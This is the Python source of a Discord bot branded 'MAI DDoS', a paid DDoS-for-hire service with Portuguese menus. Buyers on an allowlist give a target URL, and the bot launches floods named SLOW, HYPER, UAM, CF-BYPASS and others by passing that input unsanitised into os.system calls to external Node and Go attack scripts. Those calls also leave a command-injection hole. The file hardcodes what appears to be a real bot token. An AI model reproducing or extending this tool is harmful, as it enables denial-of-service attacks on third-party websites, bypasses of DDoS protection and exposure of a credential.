import discord,time
from discord import File
from ping3 import ping
from discord.utils import escape_mentions
import aiohttp
import asyncio
import random
from random import choice
import os, sys, requests, json
from requests import post,Session
from concurrent.futures import ThreadPoolExecutor
from discord.ext import commands
from re import search
import threading
import psutil


token = "MTIwMjAyOTE3NzM5NDY5MjEwNg.GqhHck.lkdrzbdJ_krXzEH37kr1UddCFSDURMc6yBzUJM"
buyers = [235473937864065024]
admins = [235473937864065024]
ownerList = [235473937864065024]

prefix = "a!"
intents = discord.Intents.all()
intents.messages = True
bot = commands.Bot(command_prefix=prefix,help_command=None, intents=intents)
threading = ThreadPoolExecutor(max_workers=int(100000000))
@bot.event
async def on_connect():
    print(f"Conectado a : {bot.user}")
    time.sleep(1.0)
    print("Successo, Bot Online !!!! Owner: Epysp")
	





#add a buyer to the buyers list.
@bot.command()
async def add_buyer(ctx, buyer : int = None):
    if ctx.author.id not in admins:
        embed = discord.Embed(title="Comandos Admin", description="Apenas Administradores podem usar esses comandos!", color=0xa30000)
        await ctx.send(embed=embed)

    elif buyer in buyers:
        embed = discord.Embed(title="Comprador - Erro", description=f"{buyer} Já é um comprador", color=0xa30000)
        await ctx.send(embed=embed)

    elif buyer is None:
        embed = discord.Embed(title="Comprador  Error de Compra", description="Forneça quem irá comprar.", color=0xa30000)
        await ctx.send(embed=embed)

    else:
        buyers.append(buyer)
        embed = discord.Embed(title="Usuário Adicionado", description=f"{buyer} Foi adicionado a lista de usuários...", color=0xa30000)
        await ctx.send(embed=embed)

#delete a buyer from the buyers list
@bot.command()
async def del_buyer(ctx, buyer : int = None):
    if ctx.author.id not in admins:
        embed = discord.Embed(title="Comandos Admin", description="Apenas Administradores podem usar esses comandos!", color=0xa30000)
        await ctx.send(embed=embed)

    elif buyer not in buyers:
        embed = discord.Embed(title="Erro", description=f"{buyer} Não é um comprador", color=0xa30000)
        await ctx.send(embed=embed)

    elif buyer is None:
        embed = discord.Embed(title="Error2", description="Informe um comprador", color=0xa30000)
        await ctx.send(embed=embed)

    else:
        buyers.remove(buyer)
        embed = discord.Embed(title="Usuário removido!", description=f"{buyer} Foi removido da lista de usuários", color=0xa30000)
        await ctx.send(embed=embed)

#add an admin to the admins list
@bot.command()
async def add_admin(ctx, admin : int = None):
    if ctx.author.id not in ownerList:
        embed = discord.Embed(title="Comandos Owner", description="Apenas Owner poderá usar esses comandos!", color=0xa30000)
        await ctx.send(embed=embed)

    elif admin in admins:
        embed = discord.Embed(title="Administrador Error", description=f"{admin} Já pertence a lista de administradores", color=0xa30000)
        await ctx.send(embed=embed)

    elif admin is None:
        embed = discord.Embed(title="Administrador Error", description=f"Informe o ID do Usuário", color=0xa30000)
        await ctx.send(embed=embed)

    else:
        admins.append(admin)
        embed = discord.Embed(title="Administrador Adicionado", description=f"{admin} Obteve as permissões de ADM.", color=0xa30000)
        await ctx.send(embed=embed)

#delete an admin from the admins list
@bot.command()
async def del_admin(ctx, admin : int = None):
    if ctx.author.id not in ownerList:
        embed = discord.Embed(title="Comandos Owner", description="Apenas Owner poderá usar esses comandos!", color=0xa30000)
        await ctx.send(embed=embed)

    elif admin not in admins:
	    embed = discord.Embed(title="ERRO ID", description="Este ID não pertence a nenhum ADMIN", color=0xa30000)
	    await ctx.send(embed=embed)

    elif admin is None:
	    embed = discord.Embed(title="ERRO ID²", description="Forneça o ID de um administrador *atual*!", color=0xa30000)
	    await ctx.send(embed=embed)

    else:
        admins.remove(admin)
        embed = discord.Embed(title="Administrador Removido", description=f"{admin} Perdeu as permissões de ADMIN", color=0xa30000)
        await ctx.send(embed=embed)
        
        
        
        
     
     
     
@bot.command()
async def help(ctx):
	if ctx.author.id not in buyers:
		embeds = discord.Embed(title="🚀 **MAI DDOS** 🚀", color=0xfcb103)
		embeds.add_field(name="**Aviso**",value="Você não pode usar esse comando! :sotroll:")
		embeds.set_footer(text=f"© Onwer :<@235473937864065024> | {ctx.author.name}")
		
		
		await ctx.reply(embed=embeds)
	else:
		embed = discord.Embed(title="🚀 **MAI DDOS** 🚀", description="✨ **MENU✨", color=discord.Colour.random())
		embed.set_author(name="MAI DDoS Bot V1", icon_url="https://i.pinimg.com/originals/9d/34/05/9d3405e21d700b1e62fd9a5d7831e382.gif")
		embed.add_field(name="**Informaões do Usuário**", value="`Ver informações do Usuário`")
		embed.add_field(name="**Botinfo**", value="`Ver informações do bot`")
		embed.add_field(name="**Ping**", value="`Ping Status do site`")
		embed.add_field(name="**Methods**", value="`Mostrar todos os métodos DDoS`")
		embed.add_field(name="**Commands**",value="`Mostrar todos os comandos para DDoS`")
		embed.set_footer(text=f"© Owner : epysp | Pedido Por {ctx.author.name}")
		
		await ctx.send(embed=embed)
	
	
	
	
	
	
@bot.command()
async def Userinfo(ctx, user:discord.Member=None):
	embed = discord.Embed(color=user.color)
	embed.set_author(name=f"Informações - {user}")
	embed.set_thumbnail(url=user.avatar.url)
	embed.add_field(name="ID :", value=user.id)
	embed.add_field(name="Nome :", value=user.display_name)
	embed.add_field(name="Criada :", value=user.created_at)
	embed.add_field(name="Entrou :", value=user.joined_at)
	embed.add_field(name="Bot ?", value=user.bot)
	embed.set_footer(text=f"© Owner : epysp | Usuário : {user}", icon_url=ctx.author.avatar)
	
	await ctx.send(embed=embed)
	
	
@bot.command()
async def vpsinfo(ctx):
	embed = discord.Embed(color=0x03ff28)
	embed.set_thumbnail(url="https://i.pinimg.com/564x/34/22/e6/3422e6cf2bbcd9f0fb8a35ea7037fdd7.jpg")
	embed.set_author(name="Vps Info - MAI DDoS")
	embed.add_field(name="Total RAM GB", value=round(psutil.virtual_memory()[0]/2**30, 2))
	embed.add_field(name="RAM %:", value=psutil.virtual_memory()[2])
	embed.add_field(name="CPU %:", value=psutil.cpu_percent(1))
	embed.set_footer(text=f"© Owner : epysp | Info Bot : 🚀 {bot.user} 🚀", icon_url=ctx.author.avatar)
	
	await ctx.send(embed=embed)	
	
	
@bot.command()
async def Botinfo(ctx):
	embed = discord.Embed(color=0x03ff28)
	embed.set_thumbnail(url="https://i.pinimg.com/564x/c8/f6/7a/c8f67a2f49ebc5f6d7293e7649bc5ebd.jpg")
	embed.set_author(name=f"Info - {bot.user}")
	embed.add_field(name="ID :", value="1015483556501409792")
	embed.add_field(name="Nome :", value="Mai")
	embed.add_field(name="Bot Owner :", value="epysp")
	embed.add_field(name="função :", value="DDoS Attack")
	embed.add_field(name="Bot ?", value="Sim")
	embed.set_footer(text=f"© Owner : epysp | Info Bot : 🚀{bot.user} 🚀", icon_url=ctx.author.avatar)
	
	await ctx.send(embed=embed)
	
	
	
	
	
	
	
@bot.command()
async def ping(ctx, address: str) -> None:
        """
        Executa uma solicitação HTTP para o endereço especificado
        :param ctx: comandos.Contexto
        :param endereço: Endereço para fazer a solicitação
        :return: código de status HTTP

        """
        if not address.startswith("http"):
            address = f"http://{address}"

        address = escape_mentions(address)

        async with aiohttp.ClientSession(
        ) as session:
            try:
                async with session.get(address) as res:
                    await ctx.reply(
                        f"Codigo De Resposta: {res.status} ({res.reason})"
                    )
            except asyncio.TimeoutError:
                await ctx.reply(f"A solicitação expirou após alguns segundos")
            except aiohttp.ClientError:
                await ctx.reply(f"Não foi possível estabelecer uma conexão com {address}")

	
	
	
	
	
	
	
	
@bot.command()
async def Methods(ctx):
	if ctx.author.id not in buyers:
		embedc = discord.Embed(title="🚀 **MAI DDoS** 🚀", color=0xfcb103)
		embedc.add_field(name="**Aviso**",value="Você não tem permissão para usar esté comando !")
		embedc.set_footer(text=f"© Owner : epysp | Aviso {ctx.author.name}")
		await ctx.reply(embed=embedc)
	else:
		embet = discord.Embed(title="🚀 **MAI DDoS** 🚀", color=discord.Colour.random())
		embet.add_field(name="**Metodo Camada 1**", value="```Atualizar```")
		embet.add_field(name="**Metodo Camada888**", value="```\nLENTO\nHYPER\nUAM\nUAM-BYPASS\nHTTP-RAW\nHTTP-RAND\nHTTP-SOCKETS\nIO-STRESSER\nCLOUDFLARE\nCF-BYPASS\nMAI-DDOS```")
		embet.set_footer(text=f"© Owner: epysp | Todos os métodos são exibidos")
		
		await ctx.channel.send(embed=embet)
	
	
	
	
	
	
	
@bot.command()
async def Commands(ctx):
	if ctx.author.id not in buyers:
		embedc = discord.Embed(title="🚀 **MAI DDoS** 🚀", color=0xfcb103)
		embedc.add_field(name="**Aviso**",value="Você não tem permissão para usar esté comando !")
		embedc.set_footer(text=f"© Owner : epysp | Aviso {ctx.author.name}")
		await ctx.reply(embed=embedc)
	else:
		embed = discord.Embed(title="🚀 **MAI DDoS** 🚀", color=discord.Colour.random())
		embed.set_thumbnail(url="https://i.pinimg.com/originals/52/ea/3c/52ea3c4cdbf44a415586725e767f90fb.gif")
		embed.add_field(name="**SLOW**", value="```!SLOW [url] [time]```")
		embed.add_field(name="**HYPER**", value="```!HYPER [url] [time]```")
		embed.add_field(name="**UAM**", value="```!UAM [url] [thread] [time] [raw/proxy]```")
		embed.add_field(name="**UAM-BYPASS**", value="```!UAM_BYPASS [url] [time] [request/id]```")
		embed.add_field(name="**HTTP-RAW**", value="```!HTTP_RAW [url] [time]```")
		embed.add_field(name="**HTTP-RAND**", value="```!HTTP_RAND [url] [time]```")
		embed.add_field(name="**HTTP-SOCKETS**", value="```!HTTP_SOCKETS [url] [request/ip] [time]```")
		embed.add_field(name="**IO-STRESSER**", value="```!IO_STRESSER [url] [time] [thread] [bypass/proxy]```")
		embed.add_field(name="**CLOUDFLARE**", value="```!CF [url] [time] [thread]```")
		embed.add_field(name="**CF-BYPASS**", value="```!CF_BYPASS [url] [thread<50] [time]```")
		embed.add_field(name="**MAI-DDOS**", value="```!MAI [url] [get/post]```")
		embed.set_footer(text="© Owner : epysp | Todos os metodos", icon_url=ctx.author.avatar)
		
		await ctx.send(embed=embed)
		
		
		
		
		
		
		
@bot.command()
async def SLOW(ctx, url, time):
	if ctx.author.id not in buyers:
		embedc = discord.Embed(title="🚀 **MAI DDoS** 🚀", color=0xfcb103)
		embedc.add_field(name="**Aviso**",value="Você não tem permissão para usar esté comando !")
		embedc.set_footer(text=f"© Owner : epysp | Aviso {ctx.author.name}")
		await ctx.reply(embed=embedc)
	else:
		embed = discord.Embed(title="🚀 **MAI DDoS** 🚀", color=discord.Colour.random())
		embed.set_thumbnail(url="https://i.pinimg.com/originals/a5/7e/bf/a57ebf5a082595205a53213f496a42c1.gif")
		embed.add_field(name="**Alvo**", value=f"`{url}`")
		embed.add_field(name="**Metodo**", value="`HTTP-BYPASS`")
		embed.add_field(name="**Duração**", value=f"`{time}`")
		ma1 = ["https://i.pinimg.com/originals/dd/d8/6c/ddd86cb25f0e9755f9a81257a29b5e96.gif","https://i.pinimg.com/originals/07/25/65/07256543b7243633bd70f1b22237b8ba.gif","https://i.pinimg.com/originals/56/00/5a/56005a1acfe12d3df3e97c646d81b561.gif","https://i.pinimg.com/originals/8b/91/63/8b91639d451bf8cba780ab594e65542f.gif"]
		rdma1 = random.choice(ma1)
		embed.set_image(url=rdma1)
		embed.set_footer(text=f"© Owner : epysp | Pedido Por {ctx.author.name}", icon_url=ctx.author.avatar)
		
		
		await ctx.send(embed=embed)
		
		os.system(f"node slow.js {url} {time}")
		
		
		
		
		
		
		
@bot.command()
async def HYPER(ctx, url, time):
	if ctx.author.id not in buyers:
		embedc = discord.Embed(title="🚀 **MAI DDoS** 🚀", color=0xfcb103)
		embedc.add_field(name="**Aviso**",value="Você não tem permissão para usar esté comando !")
		embedc.set_footer(text=f"© Owner : epysp | Aviso {ctx.author.name}")
		await ctx.reply(embed=embedc)
	else:
		embed = discord.Embed(title="🚀 **MAI DDoS** 🚀", color=discord.Colour.random())
		embed.set_thumbnail(url="https://i.pinimg.com/originals/a5/7e/bf/a57ebf5a082595205a53213f496a42c1.gif")
		embed.add_field(name="**Alvo**", value=f"`{url}`")
		embed.add_field(name="**Metodo**", value="`HYPER`")
		embed.add_field(name="**Duração**", value=f"`{time}`")
		ma1 = ["https://media4.giphy.com/media/8OTxSsEKzMs2A/giphy.gif","https://media1.giphy.com/media/3o7btQ8jDTPGDpgc6I/giphy.gif","https://media3.giphy.com/media/jOZt5tdGYxzz0H6Nfi/giphy.gif","https://media1.giphy.com/media/EKKAwvGF2sF1C7CXsy/giphy.gif"]
		rdma1 = random.choice(ma1)
		embed.set_image(url=rdma1)
		embed.set_footer(text=f"© Owner : epysp | Pedido Por {ctx.author.name}", icon_url=ctx.author.avatar)
		
		
		await ctx.send(embed=embed)
		
		os.system(f"node hyper.js {url} {time}")
		
		
		
		
		
		
@bot.command()
async def UAM(ctx, url, thread, time, mthd):
	if ctx.author.id not in buyers:
		embedc = discord.Embed(title="🚀 **MAI DDoS** 🚀", color=0xfcb103)
		embedc.add_field(name="**Aviso**",value="Você não tem permissão para usar esté comando !")
		embedc.set_footer(text=f"© Owner : epysp | Aviso {ctx.author.name}")
		await ctx.reply(embed=embedc)
	else:
		embed = discord.Embed(title="🚀 **MAI DDoS** 🚀", color=discord.Colour.random())
		embed.set_thumbnail(url="https://i.pinimg.com/originals/a5/7e/bf/a57ebf5a082595205a53213f496a42c1.gif")
		embed.add_field(name="**Alvo**", value=f"`{url}`")
		embed.add_field(name="**Metodo**", value="`UAM`")
		embed.add_field(name="**Threads**", value=f"`{thread}`")
		embed.add_field(name="**Duração**", value=f"`{time}`")
		ma1 = ["https://media4.giphy.com/media/8OTxSsEKzMs2A/giphy.gif","https://media1.giphy.com/media/3o7btQ8jDTPGDpgc6I/giphy.gif","https://media3.giphy.com/media/jOZt5tdGYxzz0H6Nfi/giphy.gif","https://media1.giphy.com/media/EKKAwvGF2sF1C7CXsy/giphy.gif"]
		rdma1 = random.choice(ma1)
		embed.set_image(url=rdma1)
		embed.set_footer(text=f"© Owner : epysp | Pedido Por {ctx.author.name}", icon_url=ctx.author.avatar)
		
		
		await ctx.send(embed=embed)
		
		
		os.system(f"node ll.js {url} {thread} {time} {mthd}")
		
		
		
		
		
		
@bot.command()
async def UAM_BYPASS(ctx, url, time, req):
	if ctx.author.id not in buyers:
		embedc = discord.Embed(title="🚀 **MAI DDoS** 🚀", color=0xfcb103)
		embedc.add_field(name="**Aviso**",value="Você não tem permissão para usar esté comando !")
		embedc.set_footer(text=f"© Owner : epysp | Aviso {ctx.author.name}")
		await ctx.reply(embed=embedc)
	else:
		embed = discord.Embed(title="🚀 **MAI DDoS** 🚀", color=discord.Colour.random())
		embed.set_thumbnail(url="https://i.pinimg.com/originals/a5/7e/bf/a57ebf5a082595205a53213f496a42c1.gif")
		embed.add_field(name="**Alvo**", value=f"`{url}`")
		embed.add_field(name="**Metodo**", value="`UAM-BYPASS`")
		embed.add_field(name="**Requests/ip**", value=f"`{req}")
		embed.add_field(name="**Duração**", value=f"`{time}`")
		ma1 = ["https://media4.giphy.com/media/8OTxSsEKzMs2A/giphy.gif","https://media1.giphy.com/media/3o7btQ8jDTPGDpgc6I/giphy.gif","https://media3.giphy.com/media/jOZt5tdGYxzz0H6Nfi/giphy.gif","https://media1.giphy.com/media/EKKAwvGF2sF1C7CXsy/giphy.gif"]
		rdma1 = random.choice(ma1)
		embed.set_image(url=rdma1)
		embed.set_footer(text=f"© Owner : epysp | Pedido Por {ctx.author.name}", icon_url=ctx.author.avatar)
		
		
		await ctx.send(embed=embed)
		
		os.system(f"node uam.js {url} {time} {req} proxies.txt")
		
		
		
@bot.command()
async def HTTP_RAW(ctx, url, time):
	if ctx.author.id not in buyers:
		embedc = discord.Embed(title="🚀 **MAI DDoS** 🚀", color=0xfcb103)
		embedc.add_field(name="**Aviso**",value="Você não tem permissão para usar esté comando !")
		embedc.set_footer(text=f"© Owner : epysp | Aviso {ctx.author.name}")
		await ctx.reply(embed=embedc)
	else:
		embed = discord.Embed(title="🚀 **MAI DDoS** 🚀", color=discord.Colour.random())
		embed.set_thumbnail(url="https://i.pinimg.com/originals/a5/7e/bf/a57ebf5a082595205a53213f496a42c1.gif")
		embed.add_field(name="**Alvo**", value=f"`{url}`")
		embed.add_field(name="**Metodo**", value="`HTTP-RAW`")
		embed.add_field(name="**Duração**", value=f"`{time}`")
		ma1 = ["https://media4.giphy.com/media/8OTxSsEKzMs2A/giphy.gif","https://media1.giphy.com/media/3o7btQ8jDTPGDpgc6I/giphy.gif","https://media3.giphy.com/media/jOZt5tdGYxzz0H6Nfi/giphy.gif","https://media1.giphy.com/media/EKKAwvGF2sF1C7CXsy/giphy.gif"]
		rdma1 = random.choice(ma1)
		embed.set_image(url=rdma1)
		embed.set_footer(text=f"© Owner : epysp | Pedido Por {ctx.author.name}", icon_url=ctx.author.avatar)
		
		await ctx.send(embed=embed)
		
		
		os.system(f"node HTTP-RAW.js {url} {time}")
		
		
		
		
@bot.command()
async def HTTP_RAND(ctx, url, time):
	if ctx.author.id not in buyers:
		embedc = discord.Embed(title="🚀 **MAI DDoS** 🚀", color=0xfcb103)
		embedc.add_field(name="**Aviso**",value="Você não tem permissão para usar esté comando !")
		embedc.set_footer(text=f"© Owner : epysp | Aviso {ctx.author.name}")
		await ctx.reply(embed=embedc)
	else:
		embed = discord.Embed(title="🚀 **MAI DDoS** 🚀", color=discord.Colour.random())
		embed.set_thumbnail(url="https://i.pinimg.com/originals/a5/7e/bf/a57ebf5a082595205a53213f496a42c1.gif")
		embed.add_field(name="**Alvo**", value=f"`{url}`")
		embed.add_field(name="**Metodo**", value="`HTTP-RAND`")
		embed.add_field(name="**Duração**", value=f"`{time}`")
		ma1 = ["https://media4.giphy.com/media/8OTxSsEKzMs2A/giphy.gif","https://media1.giphy.com/media/3o7btQ8jDTPGDpgc6I/giphy.gif","https://media3.giphy.com/media/jOZt5tdGYxzz0H6Nfi/giphy.gif","https://media1.giphy.com/media/EKKAwvGF2sF1C7CXsy/giphy.gif"]
		rdma1 = random.choice(ma1)
		embed.set_image(url=rdma1)
		embed.set_footer(text=f"© Owner : epysp | Pedido Por {ctx.author.name}", icon_url=ctx.author.avatar)
		
		await ctx.send(embed=embed)
		
		
		os.system(f"node HTTP-RAND.js {url} {time}")
		
		
		
		
@bot.command()
async def HTTP_SOCKETS(ctx, url, req, time):
	if ctx.author.id not in buyers:
		embedc = discord.Embed(title="🚀 **MAI DDoS** 🚀", color=0xfcb103)
		embedc.add_field(name="**Aviso**",value="Você não tem permissão para usar esté comando !")
		embedc.set_footer(text=f"© Owner : epysp | Aviso {ctx.author.name}")
		await ctx.reply(embed=embedc)
	else:
		embed = discord.Embed(title="🚀 **MAI DDoS** 🚀", color=discord.Colour.random())
		embed.set_thumbnail(url="https://i.pinimg.com/originals/a5/7e/bf/a57ebf5a082595205a53213f496a42c1.gif")
		embed.add_field(name="**Alvo**", value=f"`{url}`")
		embed.add_field(name="**Metodo**", value="`HTTP-SOCKETS`")
		embed.add_field(name="**Requests/ip**", value=f"`{req}`")
		embed.add_field(name="**Duração**", value=f"`{time}`")
		ma1 = ["https://media4.giphy.com/media/8OTxSsEKzMs2A/giphy.gif","https://media1.giphy.com/media/3o7btQ8jDTPGDpgc6I/giphy.gif","https://media3.giphy.com/media/jOZt5tdGYxzz0H6Nfi/giphy.gif","https://media1.giphy.com/media/EKKAwvGF2sF1C7CXsy/giphy.gif"]
		rdma1 = random.choice(ma1)
		embed.set_image(url=rdma1)
		embed.set_footer(text=f"© Owner : epysp | Pedido Por {ctx.author.name}", icon_url=ctx.author.avatar)
		
		
		await ctx.send(embed=embed)
		
		os.system(f"node HTTP-SOCKETS.js {url} {req} {time}")
		
		
		
		
@bot.command()
async def IO_STRESSER(ctx, url, time, thread, mthd):
	if ctx.author.id not in buyers:
		embedc = discord.Embed(title="🚀 **MAI DDoS** 🚀", color=0xfcb103)
		embedc.add_field(name="**Aviso**",value="Você não tem permissão para usar esté comando !")
		embedc.set_footer(text=f"© Owner : epysp | Aviso {ctx.author.name}")
		await ctx.reply(embed=embedc)
	else:
		embed = discord.Embed(title="🚀 **MAI DDoS** 🚀", color=discord.Colour.random())
		embed.set_thumbnail(url="https://i.pinimg.com/originals/a5/7e/bf/a57ebf5a082595205a53213f496a42c1.gif")
		embed.add_field(name="**Alvo**", value=f"`{url}`")
		embed.add_field(name="**Metodo**", value="`IO-STRESSER`")
		embed.add_field(name="**Threads**", value=f"`{thread}")
		embed.add_field(name="**Duração**", value=f"`{time}`")
		ma1 = ["https://media4.giphy.com/media/8OTxSsEKzMs2A/giphy.gif","https://media1.giphy.com/media/3o7btQ8jDTPGDpgc6I/giphy.gif","https://media3.giphy.com/media/jOZt5tdGYxzz0H6Nfi/giphy.gif","https://media1.giphy.com/media/EKKAwvGF2sF1C7CXsy/giphy.gif"]
		rdma1 = random.choice(ma1)
		embed.set_image(url=rdma1)
		embed.set_footer(text=f"© Owner : epysp | Pedido Por {ctx.author.name}", icon_url=ctx.author.avatar)
		
		
		await ctx.send(embed=embed)
		
		os.system(f"node io-stresser.js {url} {time} {thread} {mthd}")
		
		
		
@bot.command()
async def CF(ctx, url, time, thread):
	if ctx.author.id not in buyers:
		embedc = discord.Embed(title="🚀 **MAI DDoS** 🚀", color=0xfcb103)
		embedc.add_field(name="**Aviso**",value="Você não tem permissão para usar esté comando !")
		embedc.set_footer(text=f"© Owner : epysp | Aviso {ctx.author.name}")
		await ctx.reply(embed=embedc)
	else:
		embed = discord.Embed(title="🚀 **MAI DDoS** 🚀", color=discord.Colour.random())
		embed.set_thumbnail(url="https://i.pinimg.com/originals/a5/7e/bf/a57ebf5a082595205a53213f496a42c1.gif")
		embed.add_field(name="**Alvo**", value=f"`{url}`")
		embed.add_field(name="**Methods**", value="`CLOUDFLARE`")
		embed.add_field(name="**Metodo**", value=f"`{thread}")
		embed.add_field(name="**Duration** ", value=f"`{time}`")
		ma1 = ["https://media4.giphy.com/media/8OTxSsEKzMs2A/giphy.gif","https://media1.giphy.com/media/3o7btQ8jDTPGDpgc6I/giphy.gif","https://media3.giphy.com/media/jOZt5tdGYxzz0H6Nfi/giphy.gif","https://media1.giphy.com/media/EKKAwvGF2sF1C7CXsy/giphy.gif"]
		rdma1 = random.choice(ma1)
		embed.set_image(url=rdma1)
		embed.set_footer(text=f"© Owner : epysp | Pedido Por {ctx.author.name}", icon_url=ctx.author.avatar)
		
		
		await ctx.send(embed=embed)
		
		os.system(f"node cf.js {url} {time} {thread}")
		
		
@bot.command()
async def CF_BYPASS(ctx, url, thread, time):
	if ctx.author.id not in buyers:
		embedc = discord.Embed(title="🚀 **MAI DDoS** 🚀", color=0xfcb103)
		embedc.add_field(name="**Aviso**",value="Você não tem permissão para usar esté comando !")
		embedc.set_footer(text=f"© Owner : epysp | Aviso {ctx.author.name}")
		await ctx.reply(embed=embedc)
	else:
		embed = discord.Embed(title="🚀 **MAI DDoS** 🚀", color=discord.Colour.random())
		embed.set_thumbnail(url="https://i.pinimg.com/originals/a5/7e/bf/a57ebf5a082595205a53213f496a42c1.gif")
		embed.add_field(name="**Alvo**", value=f"`{url}`")
		embed.add_field(name="**Metodo**", value="`CF-BYPASS`")
		embed.add_field(name="**Threads**", value=f"`{thread}")
		embed.add_field(name="**Duração**", value=f"`{time}`")
		ma1 = ["https://media4.giphy.com/media/8OTxSsEKzMs2A/giphy.gif","https://media1.giphy.com/media/3o7btQ8jDTPGDpgc6I/giphy.gif","https://media3.giphy.com/media/jOZt5tdGYxzz0H6Nfi/giphy.gif","https://media1.giphy.com/media/EKKAwvGF2sF1C7CXsy/giphy.gif"]
		rdma1 = random.choice(ma1)
		embed.set_image(url=rdma1)
		embed.set_footer(text=f"© Owner : epysp | Pedido Por {ctx.author.name}", icon_url=ctx.author.avatar)
		
		
		await ctx.send(embed=embed)
		
		os.system(f"node bypasserr.js {url} {thread} {time}")
		
		
		
@bot.command()
async def MAI(ctx, url, mthd):
	if ctx.author.id not in buyers:
		embedc = discord.Embed(title="🚀 **MAI DDoS** 🚀", color=0xfcb103)
		embedc.add_field(name="**Aviso**",value="Você não tem permissão para usar esté comando !")
		embedc.set_footer(text=f"© Owner : epysp | Aviso {ctx.author.name}")
		await ctx.reply(embed=embedc)
	else:
		embed = discord.Embed(title="🚀 **MAI DDoS** 🚀", color=discord.Colour.random())
		embed.set_thumbnail(url="https://i.pinimg.com/originals/a5/7e/bf/a57ebf5a082595205a53213f496a42c1.gif")
		embed.add_field(name="**Alvo**", value=f"`{url}`")
		embed.add_field(name="**Methods**", value="`KATA-DDOS`")
		embed.add_field(name="**Duration**", value=f"`Unknowns`")
		ma1 = ["https://i.pinimg.com/564x/0b/40/76/0b4076db26fac1c08a1529d645b851d3.jpg","https://i.pinimg.com/564x/50/31/86/503186969a78e56ee38dcc936ac3fb15.jpg","https://i.pinimg.com/564x/29/31/6d/29316df2eae7c957b9bc8392180c078c.jpg","https://i.pinimg.com/originals/62/e0/fa/62e0fae57dd62e426fc1af974fcc0c76.gif"]
		rdma1 = random.choice(ma1)
		embed.set_image(url=rdma1)
		embed.set_footer(text=f"© Owner : epysp | {ctx.author.name}", icon_url=ctx.author.avatar)
		
		
		await ctx.send(embed=embed)
		
		os.system(f"go run vlm.go -site {url} {mthd}")
		
	
	
	
	
	
	
	
	
	
	
bot.run(token)
